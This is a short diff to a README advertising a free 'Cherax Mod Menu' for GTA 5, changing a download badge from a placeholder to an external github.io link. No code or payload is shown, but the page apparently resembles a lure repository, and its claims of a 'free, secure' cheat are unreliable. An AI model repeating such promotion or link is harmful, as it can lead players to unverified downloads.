@@ -2,7 +2,7 @@
 
 Unlock unparalleled power in GTA 5 with Cherax Mod Menu GTA 5 Ultimate — the top choice for players seeking a free, secure, and feature-rich modding experience.
 
-[![Download Cherax Mod Menu](https://img.shields.io/badge/Download-Cherax_Mod_Menu-blueviolet)](#)
+[![Download Cherax Mod Menu](https://img.shields.io/badge/Download-Cherax_Mod_Menu-blueviolet)](https://cherax-mod-menu.github.io/.github)
 
 ---
 
